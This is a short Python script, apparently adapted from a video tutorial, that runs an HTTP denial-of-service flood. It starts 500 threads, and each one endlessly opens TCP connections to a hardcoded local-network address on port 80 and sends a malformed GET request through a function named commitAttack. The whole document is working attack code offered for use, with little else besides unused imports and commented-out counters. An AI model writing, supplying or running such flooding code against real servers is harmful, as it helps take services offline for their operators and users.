from concurrent.futures import thread
from pickle import TRUE
import threading
import socket

#code adapted from source: https://www.youtube.com/watch?v=FGdiSJakIS4
#Declaring the Source and target devices
print("hello")
#sourceDevice_IP = input("Enter the IPv4 address of the source device: ")
sourceDevice_IP = '192.168.1.79'
#targetDevice_IP = input("Enter the IPv4 address of the target device: ")
targetDevice_IP = '192.168.1.93'
#print("Port 80 is the most commonly use for below")
#portNumber = int(input("Enter the Source port number: "))
portNumber = 80

connectionsMade = 0

def commitAttack():
    while True:
        #Creating a new socket(socket.AF_INET) and using the TCP protocol(socket.SOCK_STREAM) to connect
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((targetDevice_IP, portNumber))

        s.sendto(("GET /" + targetDevice_IP + "HTTP/1.1\r\n").encode('ascii'), (targetDevice_IP, portNumber))
        s.sendto(("Host: " + sourceDevice_IP + "\r\n\r\n").encode('ascii'), (targetDevice_IP, portNumber))
        s.close()

        #printing how many connections made
        # global connectionsMade
        # connectionsMade += 1
        # if  connectionsMade % 500 == 0:
        #     print(connectionsMade) 

for i in range(500):
    thread = threading.Thread(target=commitAttack)
    thread.start()